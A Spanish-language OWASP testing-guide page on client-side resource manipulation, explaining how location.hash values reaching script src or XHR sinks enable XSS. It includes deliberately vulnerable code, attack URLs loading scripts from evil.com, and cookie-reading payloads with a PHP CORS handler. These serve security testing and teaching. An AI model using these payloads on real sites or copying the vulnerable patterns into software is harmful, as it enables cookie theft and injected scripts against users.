# Manipulación de recursos del lado del cliente

|ID          |
|------------|
|WSTG-CLNT-06|

## Resumen

Una vulnerabilidad de manipulación de recursos del lado del cliente es un fallo de validación de entrada. Ocurre cuando una aplicación acepta entradas controladas por el usuario que especifican la ruta de un recurso, como el origen de un iframe, JavaScript o un applet, o el controlador de un XMLHttpRequest. Esta vulnerabilidad consiste en la capacidad de controlar las URL que enlazan con algunos recursos presentes en una página web. El impacto de esta vulnerabilidad varía y, por lo general, se aprovecha para llevar a cabo ataques XSS. Esta vulnerabilidad permite interferir con el comportamiento esperado de la aplicación haciendo que cargue y renderice objetos maliciosos.

El siguiente código JavaScript muestra un posible script vulnerable en el que un atacante puede controlar `location.hash` (la fuente), cuyo valor llega al atributo `src` de un elemento script. Este caso concreto da lugar a un ataque XSS, ya que se podría inyectar JavaScript externo.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Un atacante podría dirigirse a una víctima haciendo que visite esta URL:

`www.victim.com/#https://evil.com/js.js`

Donde `js.js` contiene:

```js
alert(document.cookie)
```

Esto haría que apareciera una alerta en el navegador de la víctima.

Un escenario más dañino implica la posibilidad de controlar la URL a la que se llama en una solicitud CORS. Como CORS permite que el dominio solicitante acceda al recurso de destino mediante un enfoque basado en encabezados, el atacante podría pedir a la página de destino que cargue contenido malicioso desde su propio sitio web.

A continuación, se muestra un ejemplo de una página vulnerable:

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

El valor de `location.hash` está controlado por la entrada del usuario y se usa para solicitar un recurso externo, que luego se refleja mediante el constructo `innerHTML`. Un atacante podría pedir a una víctima que visite la siguiente URL:

`www.victim.com/#https://evil.com/html.html`

Con el controlador del payload de `html.html`:

```html
<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Objetivos de prueba

- Identificar sinks con una validación de entrada débil.
- Evaluar el impacto de la manipulación de recursos.

## Cómo probar

Para comprobar manualmente este tipo de vulnerabilidad, debemos identificar si la aplicación utiliza entradas sin validarlas correctamente. Si es así, estas entradas están bajo el control del usuario y podrían usarse para especificar recursos externos. Dado que hay muchos recursos que podrían incluirse en la aplicación (como imágenes, video, objetos, CSS e iframes), se deben investigar los scripts del lado del cliente que gestionan las URL asociadas para detectar posibles problemas.

La siguiente tabla muestra posibles puntos de inyección (sinks) que se deben comprobar:

| Tipo de recurso | Etiqueta/método                           | Sink   |
| --------------- | ----------------------------------------- | ------ |
| Frame           | iframe                                    | src    |
| Enlace          | a                                         | href   |
| Solicitud AJAX  | `xhr.open(method, [url], true);`          | URL    |
| CSS             | link                                      | href   |
| Imagen          | img                                       | src    |
| Objeto          | object                                    | data   |
| Script          | script                                    | src    |

Los más interesantes son aquellos que permiten a un atacante incluir código del lado del cliente (por ejemplo, JavaScript) que podría provocar vulnerabilidades XSS.